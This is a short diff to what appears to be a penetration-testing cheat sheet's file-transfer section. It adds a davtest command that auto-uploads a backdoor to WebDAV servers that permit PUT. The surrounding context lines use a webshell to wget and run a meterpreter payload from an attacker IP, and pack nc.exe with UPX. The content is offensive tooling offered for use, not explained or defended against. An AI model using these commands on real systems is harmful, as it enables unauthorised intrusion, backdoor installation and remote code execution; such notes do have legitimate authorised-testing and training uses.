@@ -1013,6 +1013,12 @@ File Transfers
         
         scp localfile username@$ip:~/Folder/
 
+    -   Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
+    
+        davtest -move -sendbd auto -url http://$ip
+      
+        https://github.com/cldrn/davtest
+
     -   Upload shell using limited php shell cmd  
         use the webshell to download and execute the meterpreter  
         \[curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O
@@ -1044,6 +1050,7 @@ File Transfers
         /etc/init.d/pure-ftpd restart
 
 -   Packing Files
+    -------------------------------------------------------------------------------------------------------------
 
     -   Ultimate Packer for eXecutables  
         upx -9 nc.exe
